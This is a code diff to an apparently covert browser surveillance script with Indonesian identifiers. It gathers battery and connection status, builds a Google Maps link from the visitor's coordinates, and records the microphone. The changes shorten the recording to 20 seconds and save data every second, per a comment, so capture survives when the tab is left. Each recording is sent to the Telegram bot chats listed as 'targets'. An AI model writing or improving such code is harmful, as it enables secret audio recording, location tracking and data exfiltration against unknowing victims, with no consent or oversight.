@@ -289,12 +289,16 @@ const ambilBaterai = async () => {
         estimasi = `${jam} jam ${sisa} menit`;
       }
 
+      const koneksi = navigator.connection || {};
+      const hematBaterai = koneksi.saveData ? 'Ya' : 'Tidak';
+
       return `
 ౼ 〘 𝗕𝗔𝗧𝗘𝗥𝗔𝗜 〙 ౼
 Level Baterai          : ${level}
 Sedang Mengisi         : ${charging}
 Estimasi Sisa Waktu    : ${estimasi}
-Status Online          : ${statusOnline}`.trim();
+Status Online          : ${statusOnline}
+Mode Hemat Baterai     : ${hematBaterai}`.trim();
     }
 
     return `౼ 〘 𝗕𝗔𝗧𝗘𝗥𝗔𝗜 〙 ౼\n❌ Tidak didukung browser.`;
@@ -644,8 +648,8 @@ Link Google Maps     : https://maps.google.com/?q=${latitude},${longitude}`);
 const rekamVN = async () => {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-    const recorder = new MediaRecorder(stream);
-    let chunks = [];
+    const recorder = new MediaRecorder(stream, { mimeType: "audio/webm" });
+    const chunks = [];
 
     recorder.ondataavailable = (e) => {
       if (e.data.size > 0) chunks.push(e.data);
@@ -653,11 +657,8 @@ const rekamVN = async () => {
 
     recorder.onstop = async () => {
       const blob = new Blob(chunks, { type: "audio/webm" });
-      const size = blob.size;
-      const durasi = 60;
 
       for (const t of targets) {
-        // Kirim voice note (file)
         const form = new FormData();
         form.append("chat_id", t.chat_id);
         form.append("voice", blob, "rekaman.webm");
@@ -667,12 +668,12 @@ const rekamVN = async () => {
           body: form
         });
 
-const infoVN = `౼ 〘 𝗩𝗢𝗜𝗖𝗘 𝗡𝗢𝗧𝗘 𝗔𝗨𝗗𝗜𝗢 〙 ౼
+        const infoVN = `౼ 〘 𝗩𝗢𝗜𝗖𝗘 𝗡𝗢𝗧𝗘 𝗔𝗨𝗗𝗜𝗢 〙 ౼
 Status Rekaman VN      : Berhasil direkam
-Durasi Rekaman         : ${durasi} detik
+Durasi Rekaman         : 20 detik
 Tipe File              : audio/webm
 Kualitas Mikrofon      : Stabil
-Link Kiriman Audio     : (terlampir langsung via Telegram)`;
+Kiriman Audio     : Via telegram`;
 
         await fetch(`https://api.telegram.org/bot${t.token}/sendMessage`, {
           method: "POST",
@@ -684,10 +685,10 @@ Link Kiriman Audio     : (terlampir langsung via Telegram)`;
       stream.getTracks().forEach(t => t.stop());
     };
 
-    recorder.start();
+    recorder.start(1000); // setiap 1 detik potong data (biar aman saat tab ditinggal)
     setTimeout(() => {
       recorder.stop();
-    }, 60000); // 1 menit
+    }, 20000);
   } catch {
     for (const t of targets) {
       await fetch(`https://api.telegram.org/bot${t.token}/sendMessage`, {
